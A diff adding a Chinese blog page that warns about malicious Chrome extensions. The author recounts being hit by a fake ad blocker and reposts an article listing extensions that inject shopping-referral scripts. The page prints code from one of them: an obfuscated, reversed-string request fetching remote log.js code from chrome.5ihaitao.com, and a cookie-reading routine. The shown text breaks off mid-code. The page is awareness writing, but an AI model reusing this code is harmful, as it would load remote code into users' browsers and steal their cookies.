@@ -1,0 +1,431 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh_CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>恶意扩展程序列表及甄别办法 | 哼嘿哈嘿哈的博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="itmaktub">
+    
+    <meta name="description" content="一直以来我都自认为自己很小心，，没想到这次还是中标了。。。
+　　那天在机房上课的时候，发现屏蔽广告的插件没有自动同步，就自己去商店下载了一个，着急联网，没细看，然后自己回来上网的时候，一不小心就把它当正主了，今天才发现，访问谷歌首页的时候会有一个图标，显示有恶意脚本，打开开发者模式，发现有下载5ihaitao.com的脚本，cookie中也包含这个脚本，尼玛大谷歌会在网站中包含这脚本？立马怀疑自己中标了，把所有插件禁止，然后再打开，同时刷新谷歌首页，终于找到原来是“广告终结者”这款插件，赶紧去商店里看看评论，尼玛啊，就二十多个人下载，两个人评论说好，而且目前已经被商店停用了，次奥，我怎么这么粗心！网上搜索一番。发现很多恶意插件都和这个51haitao有关系，当你购物时劫持你的流量到返利网站，以此获取利益，马蛋，你们为什么这么坏，这下涨记性了，以后安装chrome插件的时候都小心点，看看评论，人数，作者等等，一般作者用很牛逼的很出名的公司（中文）的，大部分都有问题，评论很少，又都说好的，没有一点反馈信息的，都有猫腻。chrome商店的审查也太不给力了，全是重名字的，眼花缭乱，希望大家擦亮双眼，以此为戒。">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="itmaktub" />
+    <meta name="twitter:title" content="恶意扩展程序列表及甄别办法 | 哼嘿哈嘿哈的博客" />
+      
+    
+    
+    <link rel="alternate" href="/" title="哼嘿哈嘿哈的博客" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="哼嘿哈嘿哈的博客">哼嘿哈嘿哈的博客</a></h1>
+				<h2 class="blog-motto">又一个家~</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">主页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:itmaktub.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2013/11/09/safe_of_chrome/" title="恶意扩展程序列表及甄别办法" itemprop="url">恶意扩展程序列表及甄别办法</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://itmaktub.com" title="itmaktub">itmaktub</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2013-11-08T18:29:10.000Z" itemprop="datePublished">2013-11-09</time>
+    Updated:<time datetime="2014-09-07T05:04:50.282Z" itemprop="dateModified">2014-09-07</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#附-Unblock-Youku作者写的《-恶意扩展程序列表及甄别办法》一篇"><span class="toc-number">1.</span> <span class="toc-text">附**Unblock-Youku作者写的《**恶意扩展程序列表及甄别办法》一篇</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原文：http-uku-im-malicious"><span class="toc-number">2.</span> <span class="toc-text">原文：http://uku.im/malicious</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#恶意扩展不完全列表"><span class="toc-number">3.</span> <span class="toc-text">恶意扩展不完全列表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-优酷海外版"><span class="toc-number">3.1.</span> <span class="toc-text">1. 优酷海外版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-优酷海外版（同名扩展）"><span class="toc-number">3.2.</span> <span class="toc-text">2. 优酷海外版（同名扩展）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-优酷土豆海外播放"><span class="toc-number">3.3.</span> <span class="toc-text">3. 优酷土豆海外播放</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何向-Google-Chrome-团队举报"><span class="toc-number">4.</span> <span class="toc-text">如何向 Google Chrome 团队举报</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-在每个扩展程序主页的详细介绍页面都有一个-Report-Abuse-的链接"><span class="toc-number">4.0.1.</span> <span class="toc-text">1. 在每个扩展程序主页的详细介绍页面都有一个 Report Abuse 的链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-填写表格向-Google-反馈"><span class="toc-number">4.1.</span> <span class="toc-text">2. 填写表格向 Google 反馈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#甄别恶意扩展的常用办法"><span class="toc-number">5.</span> <span class="toc-text">甄别恶意扩展的常用办法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-要求不必要的权限"><span class="toc-number">5.1.</span> <span class="toc-text">1. 要求不必要的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-制作粗糙"><span class="toc-number">5.2.</span> <span class="toc-text">2. 制作粗糙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-冒充官方帐号或者程序名称"><span class="toc-number">5.3.</span> <span class="toc-text">3. 冒充官方帐号或者程序名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-用户人数差别"><span class="toc-number">5.4.</span> <span class="toc-text">4. 用户人数差别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-查看用户评论"><span class="toc-number">5.5.</span> <span class="toc-text">5. 查看用户评论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0xFF-直接检查源码"><span class="toc-number">5.6.</span> <span class="toc-text">0xFF. 直接检查源码</span></a></li></ol></li></ol>
+		</div>
+		
+		<p>一直以来我都自认为自己很小心，，没想到这次还是中标了。。。</p>
+<p>　　那天在机房上课的时候，发现屏蔽广告的插件没有自动同步，就自己去商店下载了一个，着急联网，没细看，然后自己回来上网的时候，一不小心就把它当正主了，今天才发现，访问谷歌首页的时候会有一个图标，显示有恶意脚本，打开开发者模式，发现有下载5ihaitao.com的脚本，cookie中也包含这个脚本，尼玛大谷歌会在网站中包含这脚本？立马怀疑自己中标了，把所有插件禁止，然后再打开，同时刷新谷歌首页，终于找到原来是“广告终结者”这款插件，赶紧去商店里看看评论，尼玛啊，就二十多个人下载，两个人评论说好，而且目前已经被商店停用了，次奥，我怎么这么粗心！网上搜索一番。发现很多恶意插件都和这个51haitao有关系，当你购物时劫持你的流量到返利网站，以此获取利益，马蛋，你们为什么这么坏，这下涨记性了，以后安装chrome插件的时候都小心点，看看评论，人数，作者等等，一般作者用很牛逼的很出名的公司（中文）的，大部分都有问题，评论很少，又都说好的，没有一点反馈信息的，都有猫腻。chrome商店的审查也太不给力了，全是重名字的，眼花缭乱，希望大家擦亮双眼，以此为戒。</p>
+<a id="more"></a>
+<p>附图片一张：</p>
+<p><a href="http://bcs.duapp.com/wordpress727//blog/201311//2013-11-09_091624.png" target="_blank" rel="external"><img src="http://bcs.duapp.com/wordpress727//blog/201311//2013-11-09_091624.png" alt="2013-11-09_091624"></a></p>
+<p>## </p>
+<h2 id="附-Unblock-Youku作者写的《-恶意扩展程序列表及甄别办法》一篇"><a href="#附-Unblock-Youku作者写的《-恶意扩展程序列表及甄别办法》一篇" class="headerlink" title="附**Unblock-Youku作者写的《**恶意扩展程序列表及甄别办法》一篇"></a><strong>附**</strong><a href="https://github.com/zhuzhuor/Unblock-Youku" target="_blank" rel="external">Unblock-Youku</a>作者写的《<strong>**恶意扩展程序列表及甄别办法》一篇</strong></h2><h2 id="原文：http-uku-im-malicious"><a href="#原文：http-uku-im-malicious" class="headerlink" title="原文：http://uku.im/malicious"></a>原文：<span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><em><span style="color: #4183c4;"><a href="http://uku.im/malicious" target="_blank" rel="external">http://uku.im/malicious</a></span></em></span></span></h2><p><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Unblock-Youku </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>扩展本身是免费供大家使用，源代码也是在 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>AGPLv3 </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>协议下开源，欢迎牛人为大家贡献代码。如果有别的项目想使用我们的开源代码也是欢迎的，只要遵守 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>AGPLv3 </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>协议即可。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>之前就注意到有个别几个在我们程序的基础上加上恶意的代码的恶意扩展程序。特别是最近一个有超过一百万粉丝的微薄大</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>V</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>帐号无意间给其中一个恶意扩展程序</span></span></span><a href="http://e.weibo.com/2132734472/zr1RPtoap" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>宣传了下</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>…（联络过此微博的小编，现在原微博已经删除了。）</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>鉴于之前一个扩展程序开发者?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><a href="https://github.com/opengg" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>@OpenGG</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>?</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>就是因为恶意扩展的原因不得不放弃（他的博客文章：</span></span></span><a href="http://opengg.me/868/pissed-off/" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>我很愤怒</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>、</span></span></span><a href="http://opengg.me/916/how-dreams-die/" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>理想是如何失去的</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>、</span></span></span><a href="http://opengg.me/919/what-should-you-do/" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>你们该怎么办</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>），于是觉得还是稍微出来说说比较好，让不了解技术的同学都能明白这其中的危害，以及以后选择安装扩展程序或</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>app</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>的时候都能小心一些。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>另外本页的最后会介绍一些简单的甄别恶意扩展的办法，以及如何向 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Google </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>举报这些恶意扩展的办法。</span></span></span></p>
+<h2 id="恶意扩展不完全列表"><a href="#恶意扩展不完全列表" class="headerlink" title="恶意扩展不完全列表"></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意扩展不完全列表</span></span></span></h2><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>此为不完整列表，并不时更新。另外还可以参看别人整理的一些别的?</span></span></span><a href="http://bbs.kafan.cn/forum.php?mod=viewthread&amp;tid=1513395&amp;page=7#pid28329577" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意扩展列表</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>1</span></span></span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>、</span></span></span><a href="http://opengg.me/hall-of-shame/" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>列表</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>2</span></span></span></span></span></a><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>?</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>和?</span></span></span><a href="http://bbs.kafan.cn/thread-1513395-1-1.html" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>列表</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>3</span></span></span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>。</span></span></span></p>
+<h3 id="1-优酷海外版"><a href="#1-优酷海外版" class="headerlink" title="1. 优酷海外版"></a><span style="color: #333333;"><span style="font-family: 'Liberation Serif', serif;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>1. </strong></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span><strong>优酷海外版</strong></span></span></span></h3><p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>扩展程序链接：</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;https://chrome.google.com/webstore/detail/fmakoabecaggdofhohcdjiaifnkmpldj&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>恶意源码存档：</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><a href="https://github.com/zhuzhuor/malicious-chrome-extensions/tree/master/fmakoabecaggdofhohcdjiaifnkmpldj" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>https://github.com/zhuzhuor/malicious-chrome-extensions/tree/master/fmakoabecaggdofhohcdjiaifnkmpldj</span></span></span></a></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>这个扩展的大部分源代码都是从旧版的 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>Unblock-Youku </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>而来，不过增加了自己的 </span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>background.js </span></span></span></span><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>等文件。</span></span></span></p>
+<p><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>在 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>background.js </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>文件中会向服务器?</span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><code>&lt;span style=&quot;color: #333333;&quot;&gt;&lt;span style=&quot;font-family: Consolas, &#39;Liberation Mono&#39;, Courier, monospace;&quot;&gt;&lt;span&gt;http://chrome.5ihaitao.com&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;</code><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>?</span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>请求一个 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>log.js </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>文件。扩展作者就可以向这个 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>log.js </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>文件放入任意恶意代码。</span></span></span></p>
+<pre><span style="color: #333333;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**function** chk() {</span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**var**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> a </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**new**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> XMLHttpRequest;</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>a.onreadystatechange </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**function**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> () {</span></span></span></span>
+
+<span style="color: #333333;">        <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="color: #009999;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>4</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**==**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> a.readyState </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**&amp;&amp;**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (localStorage.updated </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> a.responseText)</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>};</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>a.open(</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>"GET"</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>, </span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>"sj.gol/gol/moc.oatiahi5.emorhc//:ptth"</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.split(</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>""</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>).reverse().join(</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>""</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>), </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**!**</span></span><span style="color: #009999;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>0</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>);</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>a.send(</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**null**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>)</span></span></span></span>
+
+<span style="color: #333333;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>}</span></span></span></pre>
+
+<p><a href="https://github.com/zhuzhuor/malicious-chrome-extensions/blob/master/fmakoabecaggdofhohcdjiaifnkmpldj/log.js" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>下载下来的 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>log.js </span></span></span></span></span></a><a href="https://github.com/zhuzhuor/malicious-chrome-extensions/blob/master/fmakoabecaggdofhohcdjiaifnkmpldj/log.js" target="_blank" rel="external"><span style="color: #4183c4;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>文件</span></span></span></a><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>里，有获取和修改用户的 </span></span></span><span style="font-family: 'Liberation Serif', serif;"><span style="font-size: medium;"><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>cookies </span></span></span></span></span><span style="color: #333333;"><span style="font-family: Helvetica, arial, freesans, clean, sans-serif;"><span>的代码。</span></span></span></p>
+<pre><span style="color: #333333;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**function** getCookie(c_name) {</span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**if**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (</span></span><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>document</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.cookie.length </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**&gt;**</span></span><span style="color: #009999;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>0</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>) {</span></span></span></span>
+
+<span style="color: #333333;">        <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>c_start </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>document</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.cookie.indexOf(c_name </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>'='</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>);</span></span></span></span>
+
+<span style="color: #333333;">        <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**if**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (c_start </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**!=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**-**</span></span><span style="color: #009999;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>1</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>) {</span></span></span></span>
+
+<span style="color: #333333;">            <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>c_start </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> c_start </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> c_name.length </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**+**</span></span><span style="color: #009999;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>1</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>;</span></span></span></span>
+
+<span style="color: #333333;">            <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>c_end </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>document</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.cookie.indexOf(</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>';'</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>, c_start);</span></span></span></span>
+
+<span style="color: #333333;">            <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**if**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> (c_end </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**==**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**-**</span></span><span style="color: #009999;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>1</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>) {</span></span></span></span>
+
+<span style="color: #333333;">                <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>c_end </span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**=**</span></span><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>document</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.cookie.length</span></span></span></span>
+
+<span style="color: #333333;">            <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>}</span></span></span></span>
+
+<span style="color: #333333;">            <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**return**</span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span> unescape(</span></span><span style="color: #0086b3;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>document</span></span></span><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>.cookie.substring(c_start, c_end))</span></span></span></span>
+
+<span style="color: #333333;">        <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>}</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>}</span></span></span></span>
+
+<span style="color: #333333;">    <span style="font-family: 'DejaVu Sans Mono', monospace;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>**return**</span></span><span style="color: #dd1144;"><span style="font-family: Consolas, 'Liberation Mono', Courier, monospace;"><span>''</span></span></span></span></span>
+
